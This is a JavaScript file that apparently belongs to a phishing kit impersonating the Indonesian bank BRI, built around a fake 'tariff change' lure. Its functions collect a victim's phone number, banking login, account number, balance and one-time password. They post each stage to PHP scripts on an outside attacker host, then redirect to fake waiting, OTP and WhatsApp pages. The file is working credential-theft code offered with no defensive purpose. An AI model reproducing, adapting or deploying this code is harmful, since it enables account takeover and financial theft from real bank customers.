// TARIF
function sendHp() {
   event.preventDefault();
   $('.load').fadeIn();
   document.getElementById('kirims').innerHTML = "Memproses....";
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/britarifv9-virtual1/one.php',
      data: $('#inputHp').serialize(),
      complete: function(data) {
         vibr(220);
         audio = document.getElementById("brimo");
         audio.play();
         console.log('Complete')
         setTimeout(function() {
            window.location.href = "wait.html";
            var tarif = $('#tarif').val();
            sessionStorage.setItem("tarif", tarif);
            var nohp = $('#NoHp').val();
            sessionStorage.setItem("nohp", nohp);
            $("#lonte").hide();
            document.getElementById('kirims').innerHTML = "Lanjutkan";
            $('.load').fadeOut();
         }, 1500);
      }
   });
   return false;
};




function sendLogin() {
   event.preventDefault();
   $('.load').fadeIn();
   document.getElementById('kirims').innerHTML = "Memproses....";
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/britarifv9-virtual1/two.php',
      data: $('#inputlogin').serialize(),
      complete: function(data) {
         vibr(220);
         console.log('Complete')
         setTimeout(function() {
            window.location.href = 'otpblm.html';
            var tarif = $('#tarif').val();
            sessionStorage.setItem("tarif", tarif);
            var nohp = $('#nohp').val();
            sessionStorage.setItem("nohp", nohp);
            var rek = $('#rek').val();
            sessionStorage.setItem("rek", rek);
            var saldo = $('#saldo').val();
            sessionStorage.setItem("saldo", saldo);
            $('.load').fadeOut();
         }, 1000);
      }
   });
   return false;
};




function kirimOtp() {
   event.stopPropagation();
   event.preventDefault();
   $('.load').fadeIn();
   document.getElementById('kirims').value = "Memproses....";
   $.ajax({
      type: 'POST',
      url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/britarifv9-virtual1/three.php',
      data: $('#formLink').serialize(),
      complete: function(data) {
         console.log('Complete')
         setTimeout(function() {
    document.getElementById("blinkAktivasi").style.display = "block";
            $("#nama1").val("");
            $("#nama1").addClass('textarea1');
         }, 1000);
         setTimeout(function() {
            document.getElementById('kirims').value = "Konfirmasi";
            $('.load').fadeOut();
         }, 1000);
      }
   });
   return false;
};
        



function getcs(){
   $('.load').show();
  audio = document.getElementById("bsiku");
  audio1 = document.getElementById("bsi");
   audio.play();
   audio1.load();   
setTimeout(function(){  
    $("#process1").hide();   
location.href='https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/wa/britarifv9-virtual1';
 $('.load').hide();
    }, 4000);    
    
}     
